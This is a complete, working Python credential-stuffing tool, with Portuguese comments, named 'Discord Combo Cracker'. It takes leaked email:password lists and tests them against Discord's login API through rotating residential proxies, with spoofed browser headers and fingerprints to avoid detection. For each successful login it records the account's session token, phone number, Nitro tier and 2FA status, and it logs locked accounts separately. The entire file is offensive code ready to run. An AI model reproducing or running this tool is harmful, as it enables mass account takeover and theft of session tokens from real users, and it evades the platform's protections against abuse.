#!/usr/bin/env python3
"""
DISCORD COMBO CRACKER v2.0 — PROXY RESIDENCIAL
Testa combos email:senha no Discord via proxies reais
"""

import aiohttp, asyncio, json, sys, os, time, random, base64
from colorama import Fore, Style, init
init(autoreset=True)

# ── CONFIG ──
PROXY_FILE = "/data/data/com.termux/files/home/storage/downloads/Residencial Proxys/proxies_auth.txt"
COMBO_FILE = "combos.txt"
OUTPUT_GOOD = "combos_validos.txt"
OUTPUT_HITS = "hits_discord.txt"
MAX_CONCURRENT = 30
TIMEOUT = 20

stats = {"hits": 0, "invalid": 0, "locked": 0, "checking": 0, "total": 0}

def c(tipo, txt):
    cores = {
        "hit": f"{Fore.GREEN}[✅ HIT]{Fore.RESET}",
        "invalid": f"{Fore.RED}[❌ INVALID]{Fore.RESET}",
        "locked": f"{Fore.YELLOW}[🔒 LOCKED]{Fore.RESET}",
        "nitro": f"{Fore.MAGENTA}[⭐ NITRO]{Fore.RESET}",
        "phone": f"{Fore.CYAN}[📱 PHONE]{Fore.RESET}",
        "rate": f"{Fore.RED}[⏳ RATE]{Fore.RESET}",
        "info": f"{Fore.BLUE}[i]{Fore.RESET}",
        "mfa": f"{Fore.YELLOW}[🔐 2FA]{Fore.RESET}"
    }
    return f"{cores.get(tipo, '[?]')} {txt}"

def carregar_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            for line in f:
                line = line.strip()
                if line and '@' in line:
                    proxies.append(f"http://{line}")
    return proxies

def carregar_combos():
    combos = []
    if os.path.exists(COMBO_FILE):
        with open(COMBO_FILE) as f:
            for line in f:
                line = line.strip()
                if ':' in line and '@' in line.split(':')[0]:
                    combos.append(line)
        print(c("info", f"{len(combos)} combos carregados"))
    else:
        with open(COMBO_FILE, 'w') as f:
            f.write("# email:senha\n")
        print(c("info", f"Arquivo {COMBO_FILE} criado. Cola os combos!"))
        sys.exit(1)
    return combos

def gen_fingerprint():
    """Gera X-Fingerprint realista"""
    return ''.join(random.choices('0123456789abcdef', k=32))

def gen_super_props():
    return base64.b64encode(json.dumps({
        "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US",
        "browser_version":"120.0.0.0","os_version":"10",
        "referrer":"","referring_domain":"","release_channel":"stable",
        "client_build_number":random.randint(210000,235000)
    }).encode()).decode()

async def try_login(sem, combo, proxy, proxies, total):
    async with sem:
        proxy_atual = random.choice(proxies)
        if ':' not in combo:
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        
        if not email or not password:
            return
        
        fingerprint = gen_fingerprint()
        
        hdrs = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            ]),
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login",
            "X-Super-Properties": gen_super_props(),
            "X-Fingerprint": fingerprint,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
        }
        
        payload = {
            "login": email,
            "password": password,
            "undelete": False,
            "captcha_key": None,
            "login_source": None,
            "gift_code_sku_id": None
        }
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            try:
                # Passo 1: Pega fingerprint
                async with s.get("https://discord.com/api/v10/experiments?with_guild_experiments=true",
                               headers=hdrs,
                               proxy=proxy_atual,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                    if r.status == 200:
                        data = await r.json()
                        fingerprint = data.get('fingerprint', fingerprint)
                
                # Passo 2: Tenta login
                hdrs["X-Fingerprint"] = fingerprint
                async with s.post("https://discord.com/api/v10/auth/login",
                                headers=hdrs,
                                json=payload,
                                proxy=proxy_atual,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                    
                    res = await r.json()
                    
                    if r.status == 200:
                        token = res.get('token', '')
                        user = res.get('user', {})
                        username = f"{user.get('username','?')}#{user.get('discriminator','0')}"
                        uid = user.get('id', '?')
                        email_ret = user.get('email', email)
                        phone = user.get('phone', '')
                        mfa = res.get('mfa', False)
                        verified = user.get('verified', False)
                        premium = user.get('premium_type', 0)
                        
                        nitro_map = {0: "Sem", 1: "Classic", 2: "Nitro", 3: "Basic"}
                        nitro = nitro_map.get(premium, "?")
                        
                        extras = []
                        if premium > 0: extras.append(f"⭐{nitro}")
                        if phone: extras.append(f"📱+{phone[:4]}****")
                        if mfa: extras.append(f"🔐2FA")
                        if not verified: extras.append(f"⚠️SEM VERIFY")
                        
                        extra_str = f" | {' '.join(extras)}" if extras else ""
                        
                        print(f"\n{c('hit', f'{combo}')}")
                        print(f"   └─ {Fore.CYAN}{username} [{uid}]{Fore.RESET}{extra_str}")
                        
                        # Salva hits
                        with open(OUTPUT_HITS, 'a') as f:
                            f.write(f"{combo} | {username} | {uid} | Nitro: {nitro} | Phone: {phone} | 2FA: {mfa} | Verified: {verified} | Token: {token}\n")
                        
                        # Salva só o token
                        with open("tokens_validos.txt", 'a') as f:
                            f.write(f"{token}\n")
                        
                        stats["hits"] += 1
                        return True
                        
                    elif r.status == 400:
                        msg = res.get('message', '')
                        code = res.get('code', 0)
                        
                        if code == 219000:  # Locked/suspicious
                            print(c("locked", f"{combo}"))
                            stats["locked"] += 1
                            with open("combos_locked.txt", 'a') as f:
                                f.write(f"{combo}\n")
                            return False
                        elif 'captcha' in msg.lower() or code == 20033:
                            # Precisa captcha - pula
                            pass
                        elif code == 1014 or 'password' in msg.lower():
                            stats["invalid"] += 1
                            if stats["invalid"] % 20 == 0:
                                print(f"\r{Fore.RED}[❌] Inválidos: {stats['invalid']}{Fore.RESET}", end='')
                            return False
                        else:
                            stats["invalid"] += 1
                            return False
                            
                    elif r.status == 429:
                        retry = int(r.headers.get('Retry-After', 5))
                        await asyncio.sleep(retry + 2)
                        return False
                        
                    else:
                        stats["invalid"] += 1
                        return False
                        
            except asyncio.TimeoutError:
                return False
            except Exception as e:
                return False
            finally:
                stats["checking"] += 1
                if stats["checking"] % 10 == 0:
                    pct = (stats["checking"] / total) * 100
                    print(f"\r{Fore.BLUE}[{stats['checking']}/{total}] {pct:.0f}% | ✅{stats['hits']} ❌{stats['invalid']} 🔒{stats['locked']}{Fore.RESET}", end='')

async def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"""{Fore.CYAN}
╔══════════════════════════════════════════╗
║     DISCORD COMBO CRACKER v2.0           ║
║     PROXY RESIDENCIAL MODE               ║
╚══════════════════════════════════════════╝{Fore.RESET}
""")
    
    proxies = carregar_proxies()
    combos = carregar_combos()
    
    if not combos:
        return
    
    print(c("info", f"Carregando {len(combos)} combos com {len(proxies)} proxies..."))
    print("─" * 60)
    
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    start = time.time()
    
    tasks = []
    for combo in combos:
        proxy = random.choice(proxies)
        task = asyncio.create_task(try_login(sem, combo, proxy, proxies, len(combos)))
        tasks.append(task)
        await asyncio.sleep(0.03)  # delay pra não flood
    
    await asyncio.gather(*tasks)
    
    elapsed = time.time() - start
    print("\n" + "═" * 60)
    print(f"""{Fore.CYAN}
╔══════════════════════════════════════════╗
║  RESUMO FINAL                          ║
╚══════════════════════════════════════════╝{Fore.RESET}
""")
    print(f"  {Fore.GREEN}✅ Hits:       {stats['hits']}{Fore.RESET}")
    print(f"  {Fore.RED}❌ Inválidos:  {stats['invalid']}{Fore.RESET}")
    print(f"  {Fore.YELLOW}🔒 Locked:     {stats['locked']}{Fore.RESET}")
    print(f"  {Fore.BLUE}⏱️ Tempo:      {elapsed:.1f}s{Fore.RESET}")
    print(f"  {Fore.WHITE}📁 Hits salvos: {OUTPUT_HITS}{Fore.RESET}")
    print(f"  {Fore.WHITE}📁 Tokens:     tokens_validos.txt{Fore.RESET}")
    print("═" * 60)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompido{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}[FATAL] {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
